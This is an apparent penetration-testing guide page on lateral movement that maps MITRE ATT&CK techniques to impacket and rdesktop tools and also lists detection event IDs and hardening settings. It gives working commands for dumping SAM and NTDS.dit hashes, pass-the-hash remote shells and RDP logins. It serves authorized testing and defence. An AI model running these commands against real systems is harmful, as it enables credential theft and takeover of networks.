---
title: "Phase 10: Lateral Movement"
category: "Kali Linux Penetration Testing"
phase: "10"
topic: "Lateral Movement"
mitre_tactic: "lateral_movement"
mitre_tactic_id: "TA0008"
date: "2026-07-18"
---

# Phase 10: Lateral Movement

## Overview

Lateral movement is the MITRE ATT&CK tactic (TA0008) focused on moving through a network after gaining initial access. Once an attacker compromises one host, lateral movement techniques enable access to additional systems using harvested credentials, remote services, and network protocols. This phase bridges the gap between initial foothold and domain-wide compromise.

In penetration testing, lateral movement demonstrates how an attacker can pivot from a single compromised host to control the entire network. The tools in this phase exploit Windows remote services (SMB, RDP, WMI, WinRM) using credentials obtained through credential harvesting, pass-the-hash, or Kerberos attacks.

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Description |
|-------------|---------------|-------------|
| T1021.001 | Remote Services: RDP | Using RDP for lateral movement with valid credentials |
| T1021.002 | Remote Services: SMB/Windows Admin Shares | Using SMB and ADMIN$/C$ shares for remote execution |
| T1021.003 | Remote Services: DCOM | Distributed COM for remote command execution |
| T1021.004 | Remote Services: SSH | SSH-based lateral movement to non-Windows systems |
| T1021.006 | Remote Services: Windows Remote Management | WinRM for remote PowerShell execution |
| T1550.002 | Use Alternate Authentication Material: Pass the Hash | Using NTLM hashes for authentication without plaintext |
| T1550.003 | Use Alternate Authentication Material: Pass the Ticket | Using Kerberos tickets for authentication |
| T1570 | Lateral Tool Transfer | Moving tools between compromised hosts |

## Tools in This Phase

| Tool | Protocol | Type | Description |
|------|----------|------|-------------|
| **[impacket-psexec](impacket-psexec/impacket-psexec.md)** | SMB + SCM | Remote Execution | Binary-uploading remote shell via named pipes with pass-the-hash support |
| **[impacket-smbexec](impacket-smbexec/impacket-smbexec.md)** | SMB + SCM | Remote Execution | Lightweight remote execution without binary upload via SMB |
| **[rdesktop](rdesktop/rdesktop.md)** | RDP | GUI Access | Full graphical desktop session for lateral movement via RDP |

## Lateral Movement Attack Flow

```text
┌──────────────┐     ┌──────────────────┐     ┌──────────────────┐
│  Initial     │────▶│  Credential      │────▶│  Lateral Move    │
│  Access      │     │  Harvest         │     │  to Next Host    │
└──────────────┘     └──────────────────┘     └──────────────────┘
        │                                            │
        ▼                                            ▼
┌──────────────┐     ┌──────────────────┐     ┌──────────────────┐
│  Persistence │◀────│  Escalate        │◀────│  New Credential  │
│  Established │     │  Privileges      │     │  Harvested       │
└──────────────┘     └──────────────────┘     └──────────────────┘
```

## Tool Selection Guide

| Scenario | Recommended Tool | Why |
|----------|-----------------|-----|
| Interactive shell with pass-the-hash | **impacket-psexec** | Full cmd.exe via named pipe, PtH support |
| Lightweight remote execution | **impacket-smbexec** | No binary upload, smaller footprint |
| GUI access to Windows desktop | **rdesktop** | Full RDP session with drive/clipboard sharing |
| Domain lateral movement | **impacket-psexec** | Kerberos + PtH support, domain-aware |
| Stealthier execution | **impacket-smbexec** | No binary drop, no named pipe |
| File transfer via GUI | **rdesktop** | Drive redirection for drag-and-drop |
| Non-English Windows systems | **impacket-psexec** | Codec support for correct output encoding |
| Legacy Windows systems | **rdesktop** | RDP 4/5 support for older systems |

## Protocol Comparison

```text
Protocol    Port    Auth Required    Binary Upload    Interactive    Stealth
─────────────────────────────────────────────────────────────────────────────
SMB/PsExec  445     Admin creds      Yes (psexesvc)   Full shell     Low
SMB/SMBExec 445     Admin creds      No               Semi-shell     Medium
RDP         3389    User creds       No               Full GUI       Medium
WMI         135+    Admin creds      No               Semi-shell     High
WinRM       5985    Admin creds      No               Semi-shell     Medium
```

## Prerequisites

Before using lateral movement tools, ensure:

1. **Authorization:** Written scope agreement permits lateral movement across hosts
2. **Valid credentials:** Username/password, NTLM hashes, or Kerberos tickets
3. **Network access:** Required ports open (445 for SMB, 3389 for RDP)
4. **Administrative access:** Most tools require local admin privileges on targets
5. **Scope documentation:** All target hosts listed in engagement scope

## Credential Harvesting for Lateral Movement

```bash
# Dump SAM hashes from compromised Windows host
impacket-secretsdump administrator:'P@ssw0rd'@192.168.1.10

# Dump NTDS.dit from domain controller
impacket-secretsdump -hashes :HASH DOMAIN/administrator@192.168.1.5 -just-dc

# Extract cached credentials
impacket-secretsdump -hashes :HASH administrator@192.168.1.10 -just-dc-ntlm

# Parse local SAM/SYSTEM hives
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
```

## Quick Reference: Connection Commands

```bash
# SMBExec: Pass-the-hash
impacket-smbexec -hashes :NTHASH administrator@192.168.1.20

# PsExec: Full interactive shell
impacket-psexec administrator:'P@ssw0rd'@192.168.1.20

# PsExec: Single command
impacket-psexec -hashes :NTHASH administrator@192.168.1.20 "whoami"

# rdesktop: GUI session
rdesktop -u administrator -p 'P@ssw0rd' 192.168.1.20

# rdesktop: With drive sharing
rdesktop -u admin -p 'pass' -r disk:data=/mnt/data 192.168.1.20
```

## Detection and Defense

### Blue Team Indicators

| Indicator | Detection Method |
|-----------|-----------------|
| SMB service creation | Windows Event ID 7045 (new service) |
| RDP logon events | Windows Event ID 4624 (Logon Type 10) |
| Named pipe creation | Windows Event ID 5140 (share access) |
| NTLM authentication | Windows Event ID 4624 (Logon Type 3) |
| ADMIN$/C$ access | File monitoring on administrative shares |
| Lateral movement chains | Correlation of logon events across hosts |

### Preventive Controls

```bash
# Enable LSA protection
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f

# Disable NTLM where possible
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v RestrictReceivingNTLMTraffic /t REG_DWORD /d 2 /f

# Restrict RDP access
New-NetFirewallRule -DisplayName "Allow RDP Internal" -Direction Inbound \
    -Protocol TCP -LocalPort 3389 -RemoteAddress 10.0.0.0/8 -Action Allow

# Enable NLA for RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' \
    -Name "UserAuthentication" -Value 1

# Audit service creation
auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable
```

## Common Pitfalls

- **Wrong credentials:** Pass-the-hash requires exact NTLM hashes; wrong hash = access denied
- **Account lockout:** Repeated failed attempts trigger lockout; limit authentication attempts
- **Scope violations:** Lateral movement to out-of-scope hosts breaks engagement rules
- **Missing listener:** For reverse shells, ensure a listener is active before execution
- **Firewall blocking:** SMB (445) and RDP (3389) may be filtered between segments
- **NLA enforcement:** Modern Windows requires NLA; older tools may fail
- **Log noise:** Service creation and logon events create significant forensic evidence
- **Binary detection:** PsExec binary may be flagged by AV/EDR; use SMBExec instead

## Post-Engagement Checklist

```text
□ All lateral movement artifacts removed from target hosts
□ Harvested credentials documented and securely stored
□ All RDP sessions terminated
□ Service creation events reviewed for coverage
□ IP addresses and timestamps logged for report
□ All compromised hosts listed in final report
□ Remediation recommendations provided for each vulnerability
□ Engagement scope boundaries respected throughout
```

## Cross-Phase Dependencies

| Phase | Relationship |
|-------|-------------|
| **[01 Reconnaissance](../01_reconnaissance/)** | Network topology, host identification |
| **[03 Enumeration](../03_enumeration/)** | Service discovery, credential enumeration |
| **[06 Privilege Escalation](../06_privilege_escalation/)** | Escalating to admin for lateral movement |
| **[08 Credential Access](../08_credential_access/)** | Hash extraction, Kerberos ticket harvesting |
| **[09 Collection](../09_collection/)** | Data gathering from compromised hosts |
| **[13 Exfiltration](../13_exfiltration/)** | Data extraction through pivoted hosts |

## Resources

- **MITRE ATT&CK Lateral Movement:** https://attack.mitre.org/tactics/TA0008/
- **MITRE ATT&CK Remote Services:** https://attack.mitre.org/techniques/T1021/
- **Impacket Documentation:** https://github.com/fortra/impacket/wiki
- **OffSec PEN-200 Course:** https://www.offsec.com/courses/pen-200/
- **OffSec PEN-300 Course:** https://www.offsec.com/courses/pen-300/
- **Kali Linux Lateral Movement Tools:** https://www.kali.org/tools/#lateral-movement
